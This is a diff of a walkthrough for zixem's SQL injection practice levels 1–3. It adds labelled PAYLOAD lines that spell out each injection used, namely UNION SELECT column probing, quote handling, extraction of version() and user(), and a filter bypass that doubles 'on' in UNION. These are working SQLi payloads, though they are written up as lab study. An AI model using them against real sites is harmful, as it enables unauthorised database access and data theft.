@@ -25,21 +25,25 @@ Start:
 => I guess the Query can be:  
 `SELECT * FROM <db> WHERE id=1`  
 => We should add `UNION SELECT 1,2;--`  
+***PAYLOAD***: `1 UNION SELECT 1,2;--`  
 `https://zixem.altervista.org/SQLi/level1.php?id=1%20UNION%20SELECT%201,2;--`
 > - The used SELECT statements have a different number of columns **Item ID:**
 > - **Price:** $
 
 => So it doesn't have 2 columns, let's try again with more to see if the error still exist.  
+***PAYLOAD***: `1 UNION SELECT 1,2,3;--`  
 `https://zixem.altervista.org/SQLi/level1.php?id=1%20UNION%20SELECT%201,2,3;--`
 > - **Item ID:** 1
 > - **Price:** 20$
 
 => But the Data is not shown in the result. It is caused of the "id=1" data came before our data, let's **invalidate** it first.  
+***PAYLOAD***: `1 AND 1=2 UNION SELECT 1,2,3;--`  
 `https://zixem.altervista.org/SQLi/level1.php?id=1%20AND%201=2%20UNION%20SELECT%201,2,3;--`
 > - **Item ID:** 2
 > - **Price:** 1$
 
 Ok let's extract *version()* and *user()*:  
+***PAYLOAD***: `1 AND 1=2 UNION SELECT version(),user(),3;--`  
 ##### Result: #####  
 `https://zixem.altervista.org/SQLi/level1.php?id=1%20AND%201=2%20UNION%20SELECT%20version(),user(),3;--`
 > - **Item ID:** zixem@localhost
@@ -58,24 +62,29 @@ Start:
 > - **Age:** 17
 
 => Test with prev payload:  
+***PAYLOAD***: `4 AND 1=2 UNION SELECT 1,2,3,4--`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%20UNION%20SELECT%201,2,3,4--`
 > Nothing to show.
 
 => It shows nothing. That means it can be take string instead of integer, so we have to add `'` into our payload:  
+***PAYLOAD***: `4 AND 1=2%27 UNION SELECT 1,2,3--`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3--`
 > You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
 
 => OK, so we have problem with `apostrophe (')`  
+***PAYLOAD***: `4 AND 1=2%27 UNION SELECT 1,2,3--'`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3--%27`
 > The used SELECT statements have a different number of columns
 
 => It is ok now, but we have select wrong number of columns:  
+***PAYLOAD***: `4 AND 1=2%27 UNION SELECT 1,2,3,4--'`  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%201,2,3,4--%27`
 > - **User-ID:** 1
 > - **Username:** 2
 > - **Age:** 3
 
 => It is Done. Let's grep the *version()* & *user()*:  
+***PAYLOAD***: `4 AND 1=2%27 UNION SELECT version(),user(),3,4--'`  
 ##### Result: #####  
 `https://zixem.altervista.org/SQLi/level2.php?showprofile=4%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
 > - **User-ID:** 5.6.33-log
@@ -95,10 +104,12 @@ Start:
 > - **Seller:** Team Digi7al
 
 => Test with prev Payload:  
+***PAYLOAD***: `3 AND 1=2%27 UNION SELECT version(),user(),3,4--'`  
 `https://zixem.altervista.org/SQLi/level3.php?item=3%20AND%201=2%27%20UNION%20SELECT%20version(),user(),3,4--%27`
 > You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uni select version(),user(),3,4--''' at line 1
 
 => The error message tells us that the statement is being interpreted as `"uni select version(),user(),3,4--''"`, which means that the `on` of union is being filtered out. To combat this, we can add another `on`, so that even after it is removed, the statement still reads union:  
+***PAYLOAD***: `3 AND 1=2%27 UNIONON SELECT version(),user(),3,4--'`  
 ##### Result: #####  
 `https://zixem.altervista.org/SQLi/level3.php?item=3%20AND%201=2%27%20UNIONON%20SELECT%20version(),user(),3,4--%27`
 > - **ItemID:** 5.6.33-log
